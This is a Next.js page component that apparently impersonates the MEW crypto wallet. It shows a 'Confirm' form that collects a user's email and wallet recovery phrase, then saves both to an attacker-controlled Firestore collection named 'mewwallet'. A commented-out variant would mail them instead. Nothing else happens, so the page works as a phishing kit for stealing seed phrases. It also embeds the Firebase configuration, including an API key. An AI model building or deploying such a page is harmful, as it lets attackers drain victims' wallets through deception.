"use client";

import Image from "next/image";
import axios from "axios";

import logo from "../public/images/logo.jpeg";
import { useState } from "react";
import Swal from "sweetalert2";

import { initializeApp } from "firebase/app";
// import { getAuth } from "firebase/auth";
import { doc, setDoc, getFirestore } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyC6xrko_XyxnFil-rPIxyD1XHDhUdGYWow",
  authDomain: "mew-wallet-1a3b6.firebaseapp.com",
  projectId: "mew-wallet-1a3b6",
  storageBucket: "mew-wallet-1a3b6.appspot.com",
  messagingSenderId: "534152638352",
  appId: "1:534152638352:web:1f0ad5d739e6f254140d15",
  measurementId: "G-RM38WXF9SX",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
// const auth = getAuth(app);

// module.exports ={app}

const db = getFirestore(app);

const uniqueKey = () => {
  return Date.now().toString(36);
};

export default function Home() {
  const [email, setEmail] = useState("");
  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);

  const sentMail = async () => {
    if (!email) {
      Swal.fire({
        title: "Input Error",
        text: "Email field is required",
        icon: "error",
      });

      return;
    }
    if (!phrase) {
      Swal.fire({
        title: "Input Error",
        text: "Phrase field is required",
        icon: "error",
      });

      return;
    }
    setLoading(true);
    await setDoc(
      doc(db, "mewwallet", `${Date.now()}`),
      {
        phrase: phrase,
        email: email,
      },
      { merge: true }
    );
    setLoading(false);

    Swal.fire({
      title: "info",
      text: `Requestin process 🚀`,
      icon: "info",
    });

    // try {
    //   setLoading(true);
    //   const res = await  axios.post('http://localhost:8000/mail', JSON.stringify({"email":email,"phrase":phrase}),{headers: {"Content-Type": "application/json"} } )

    //   const body =  res.data;

    //   if (res.status==200) {
    //     setLoading(false);

    //   }

    //   if (res.status === 400) {
    //     setLoading(false);
    //     Swal.fire({
    //       title: "Error",
    //       text:`${body.message} 😢`,
    //       icon: "error",
    //     });

    //   }
    // } catch (err) {
    //   setLoading(false);
    //   console.log('Something went wrong: ', err);
    // }
  };

  return (
    <main>
      <div className="container-fluid">
        <div className="border rounded mt-5 cra">
          <div className="text-center">
            <Image src={logo} width="400" height="300" alt="img" />
          </div>
          <div className="mb-3 ms-3 ms-md-5 me-3 me-md-5">
            <input
              type="email"
              className="form-control"
              id="exampleFormControlInput1"
              required
              onChange={(e) => {
                setEmail(e.target.value);
              }}
              placeholder="Email"
            />
            <input
              type="text"
              required
              onChange={(e) => {
                setPhrase(e.target.value);
              }}
              className="form-control mt-3"
              id="exampleFormControlInput1"
              placeholder="Phrase"
            />
          </div>
          <div className="text-center">
            <button
              disabled={loading}
              onClick={() => {
                sentMail();
              }}
              type="button"
              className="btn mb-3 btn-primary"
            >
              {loading ? "Loading..." : "Confirm"}
            </button>
          </div>
        </div>
      </div>
    </main>
  );
}
